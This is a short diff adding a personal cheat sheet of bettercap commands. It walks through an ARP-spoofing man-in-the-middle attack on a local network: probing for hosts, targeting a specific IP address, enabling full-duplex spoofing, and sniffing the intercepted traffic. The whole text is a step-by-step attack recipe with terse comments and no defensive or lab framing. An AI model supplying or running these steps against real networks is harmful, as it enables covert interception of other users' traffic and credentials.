@@ -1,0 +1,15 @@
+sudo apt install bettercap
+
+1-bettercap => to run 
+
+2- net.probe on =>to see who is in my network 
+
+3-set arp.spoof.fullduplex true => this attack not in all routers and need target 
+
+4-set arp.spoof.targets 192.168.1.105
+
+5- set net.sniff.local true
+
+6-arp.spoof on
+
+7-net.sniff on
